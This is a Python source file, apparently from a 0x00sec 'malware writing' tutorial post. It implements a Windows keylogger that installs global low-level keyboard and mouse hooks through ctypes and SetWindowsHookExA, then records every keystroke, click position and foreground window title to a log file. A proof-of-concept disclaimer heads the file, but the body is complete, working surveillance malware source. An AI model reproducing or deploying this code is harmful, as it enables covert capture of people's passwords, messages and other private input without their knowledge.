# https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858
# KEYLOGGER WITH CTYPES AND SETWINDOWSHOOKEX FROM MY 0X00SEC POST.
# THIS IS A PROOF-OF-CONCEPT AND I AM NOT RESPONSIBLE FOR ANY 
# USAGE OF THIS CODE OR MALICIOUS PURPOSE.

from ctypes import (
    windll, GetLastError, c_long, c_ulonglong, 
    byref, create_unicode_buffer, pointer
)
from ctypes.wintypes import RECT
from win_const import *
import log
import json
import logging
import os

# Termination condition
END_KEY = VIRTUAL_KEYS_REVERSE["CTRL"]

# Shorthand for the required dll librairies
user32 = windll.user32
kernel32 = windll.kernel32
shcore = windll.shcore

writer = log.Writer("log.txt")
kb_handle = None
mouse_handle = None

def install_hook(hook_id, proc):
    """Install a keyboard hook callback function.

    Args:
        proc: HOOKPROC callback function.
    
    Return:
        Handle to the hook procedure if success, None otherwise.
    """
    handle = user32.SetWindowsHookExA(hook_id, proc, None, 0)
    if not handle:
        # https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-
        msg = "Failed to install hook. errno=" + str(GetLastError())
        logging.error(msg)
    return handle


def uninstall_hook(handle):
    """Uninstall the keyboard hook.

    Args:
        handle: Handle to the hook procedure.
    """
    if handle:
        user32.UnhookWindowsHookEx(handle)


def get_current_window(): 
    """Get the current window title."""
    hwnd = user32.GetForegroundWindow()
    length = user32.GetWindowTextLengthW(hwnd) + 1  # NULL-terminated string buffer
    buff = create_unicode_buffer(length)
    user32.GetWindowTextW(hwnd, buff, length)
    return buff.value


def get_screen_resolution():
    """Get screen resolution before rescaling."""

    h_desktop = user32.GetDesktopWindow()
    # Get screen resoltion virtualized for DPI
    rect = RECT()
    success = user32.GetWindowRect(h_desktop, pointer(rect))
    if not success:
        raise OSError(GetLastError())

    # Get rescale factor for primary monitor
    hmonitor = user32.MonitorFromWindow(
        h_desktop, MONITOR_DEFAULTTOPRIMARY)
    rescale_factor = c_long(0)
    result = shcore.GetScaleFactorForMonitor(
        hmonitor, pointer(rescale_factor))
    if result != S_OK:
        print("Failed to GetScaleFactorForMonitor,", )
        raise OSError(GetLastError())
    
    rescale_factor = rescale_factor.value
    res_x = (rect.right - rect.left) * rescale_factor / 100
    res_y = (rect.bottom - rect.top) * rescale_factor / 100
    return res_x, res_y


def is_pressed(vkey) -> bool:
    """Determine whether a key is pressed

    Args:
        vkey: code of a virtual key
    
    Return:
        True if the virtual key is pressed, False otherwise
    """
    # https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate
    # GetKeyState returns a SHORT that specifies the status of the specified virtual key.
    # If the high-order bit is 1, the key is down; otherwise, it is up.
    return user32.GetKeyState(END_KEY) & 0x8000


def hook_procedure(nCode, wParam, lParam):
    """Hook procedure to monitor and log for mouse and keyboard events.

    Args:
        nCode:  HC_ACTION code
        wParam: Identifier of the message
        lParam: Address to an input struct based on wParam
    """
    handle = kb_handle

    # KEYDOWN event
    if nCode == HC_ACTION and wParam == WM_KEYDOWN:
        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        if kb.vkCode in VIRTUAL_KEYS:
            writer.keyboard_event(
                kb.vkCode,
                CURRENT_WINDOW=get_current_window()
            )
            handle = kb_handle 

    # MOUSE event
    if nCode == HC_ACTION and wParam in (WM_LBUTTONDOWN, WM_RBUTTONDOWN):
        mouse = MSLLHOOKSTRUCT.from_address(lParam)
        right_click = True if wParam == WM_RBUTTONDOWN else False

        # https://docs.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-mouseinput
        # Normalized x, y (0-65535)
        res_x, res_y = get_screen_resolution()
        x = int(mouse.pt.x * 65536 / res_x)
        y = int(mouse.pt.y * 65536 / res_y)
        writer.mouse_event(
            x, y, right_click,
            CURRENT_WINDOW=get_current_window()
        )
        handle = mouse_handle

    # Terminated condition
    if is_pressed(END_KEY):
        uninstall_hook(kb_handle)
        uninstall_hook(mouse_handle)
        user32.PostQuitMessage(1)

    return user32.CallNextHookEx(handle, nCode, wParam, c_ulonglong(lParam))


if __name__ == "__main__":
    ptr = HOOKPROC(hook_procedure)
    kb_handle = install_hook(WH_KEYBOARD_LL, ptr)
    mouse_handle = install_hook(WH_MOUSE_LL, ptr)  
    msg = MSG()
    user32.GetMessageA(byref(msg), 0, 0, 0) # Wait for messages to be posted
